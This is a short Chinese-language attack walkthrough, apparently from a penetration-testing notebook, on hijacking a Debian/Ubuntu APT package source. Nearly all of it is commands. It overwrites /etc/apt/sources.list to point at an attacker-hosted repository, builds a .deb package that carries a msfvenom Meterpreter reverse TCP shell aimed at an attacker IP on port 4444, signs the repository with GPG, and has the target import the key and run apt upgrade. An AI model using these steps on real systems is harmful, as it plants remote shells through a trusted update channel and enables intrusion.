### 安装源劫持

```bash
cat /etc/apt/sources.list
echo "deb http://IP地址或域名/repo/ ./" > /etc/apt/sources.list
mkdir -p /var/www/html/repo
```


repo目录里创建一个package目录，并在该目录里创建etc和DEBIAN目录

```bash
├── package
│   ├── etc
│   │   ├── linux_shell
│   │   └── hello.py
│   └── DEBIAN
│       └── control
```

linux_shell:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=IP地址 lport=4444 -f elf > linux_shell
```

[control](供应链攻击/control)

```bash
cd repo
dpkg-deb --build package
```

[Release](供应链攻击/Release)

```bash
apt-get install gnupg
gpg --gen-key
dpkg-scanpackages . /dev/null | gzip -9c > Packages.gz
gpg --default-key "密钥ID" -abs -o - Release > Release.gpg
gpg --default-key "密钥ID" --clearsign -o InRelease Release
gpg --export -a "密钥ID" > public.key
```

```bash
apt-key add public.key
sudo apt update && sudo apt upgrade
```
